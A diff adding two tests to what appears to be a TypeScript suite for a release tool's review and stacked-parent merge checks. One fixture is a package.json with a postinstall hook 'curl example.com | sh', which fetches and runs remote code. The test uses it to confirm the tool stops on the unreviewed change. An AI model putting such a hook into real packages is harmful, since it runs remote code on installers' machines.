@@ -31,6 +31,7 @@ const TEST_V2 = TEST_V1 + "test('lock 502 retries', () => { expect(2).toBe(2); }
 const BASE = { 'src/shared.ts': lines(20), 'docs/policy.md': '# Policy\n\nold rule\n', 'test/helpers/data.ts': 'export const rows = [0];\n', 'test/land.test.ts': TEST_V0 };
 const PARENT = { 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;' }), 'docs/policy.md': '# Policy\n\nparent rule\n', 'test/helpers/data.ts': 'export const rows = [1];\n', 'test/land.test.ts': TEST_V1, 'README.md': '# Fx, from the parent\n' };
 const CHILD = { 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;', 15: 'export const l15 = 150;' }), 'src/child.ts': 'export const c = 1;\n' };
+const CHILD_ONLY = { 'src/child.ts': 'export const c = 1;\n' };
 /** Main after the parent's squash: later edits to the parent's files (a doc, a helper, a test, the audited README) and one far from the child's hunk. */
 const MAIN_LATER = { 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;', 8: 'export const l8 = 80;' }), 'docs/policy.md': '# Policy\n\nparent rule\n\nmain rule\n', 'test/helpers/data.ts': 'export const rows = [1, 2];\n', 'test/land.test.ts': TEST_V2, 'README.md': '# Fx, from the parent\n\nMain moved on.\n' };
 
@@ -171,6 +172,42 @@ describe('finish after a stacked parent squash-merges (GST-1399)', () => {
     expect(lineOf(r.stdout, 'REVIEWED_BASE')).toContain(`stack parent ${parent.slice(0, 12)} landed`);
     expect(lineOf(r.stdout, 'ROUTE')).not.toContain('bounded=');
     expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('docs/review-policy.md')]);
+  });
+
+  // Value: protects=a review-loop exception with no files list cannot accept a parent change main never received: its
+  //   "touched at the fix-check head" set starts at the landed parent, not at the pre-parent fork (red-team p1 on #4021);
+  //   fails_when=the loop's atHead runs from merge-base(origin/main, fix_check.head) under a landed stack parent;
+  //   seam=route's review-loop exception
+  test('a review-loop exception does not accept a parent script main does not hold', () => {
+    const PKG = '{"name":"fx","version":"1.0.0"}\n';
+    const POSTINSTALL = '{"name":"fx","version":"1.0.0","scripts":{"postinstall":"curl example.com | sh"}}\n';
+    const { f, parent, passHead, reviewed, post } = stacked({ parentFiles: { ...PARENT, 'package.json': POSTINSTALL }, afterLand: g => g.advanceBase({ 'package.json': PKG }) });
+    f.write({ 'package.json': POSTINSTALL.replace('1.0.0', '1.0.1'), VERSION: '1.0.1.0\n' }); f.commit('bump');
+    const exception = JSON.stringify({ accepted_by: 'GStack Minder', date: '2026-11-05', via: 'test', reason: 'fixture', fix_check: { head: passHead, findings: 0 } });
+    const r = finish(f, reviewed, post, ['--reviewed-base', parent, '--review-loop-exception', exception]);
+    expect(lineOf(r.stdout, 'REVIEW_LOOP_EXCEPTION')).not.toContain('package.json');
+    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('package.json')]);
+  });
+
+  // Value: protects=a base commit whose merge with the parent conflicts never counts as holding it, even when the
+  //   conflicted tree keeps the base's bytes (a modify/delete conflict; outside voice on #4021); fails_when=heldBy reads
+  //   only the merged tree's diff and ignores merge-tree's conflict status; seam=lib/ship-receipt.ts heldBy
+  test('a parent deletion the base never took is not landed, even when the conflicted tree matches the base', () => {
+    const base = { ...BASE, 'src/a.ts': lines(10) };
+    const f = shipFixture(base, { 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;' }) }); ships.push(f);
+    expect(f.git('rm', '-q', 'src/a.ts').status).toBe(0); f.commit('parent: drop a.ts');
+    const parent = head(f);
+    expect(f.git('push', '-q', 'origin', 'feat:parent').status).toBe(0);
+    f.write(CHILD_ONLY); f.commit('child');
+    const reviewed = wtree(f);
+    const post = path.join(f.root, 'post.json');
+    expect(f.run(path.join(BIN, 'gstack-docs-candidate'), ['snapshot', '--out', post, '--audit-id', 'a1', '--mode', 'edit', '--base', 'main', '--docs', 'README.md']).status).toBe(0);
+    f.advanceBase({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;' }), 'src/a.ts': lines(10, { 2: 'export const l2 = 20;' }) });
+    f.advanceBase({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 300;' }) });
+    mergeMain(f);
+    const r = finish(f, reviewed, post, ['--reviewed-base', parent]);
+    expect(lineOf(r.stdout, 'REVIEWED_BASE')).toBe('');
+    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, expect.stringContaining('nor a landed stack parent')]);
   });
 
   // Value: protects=a reviewed executable bit reverted to main's mode after review is not held by main, so it stops
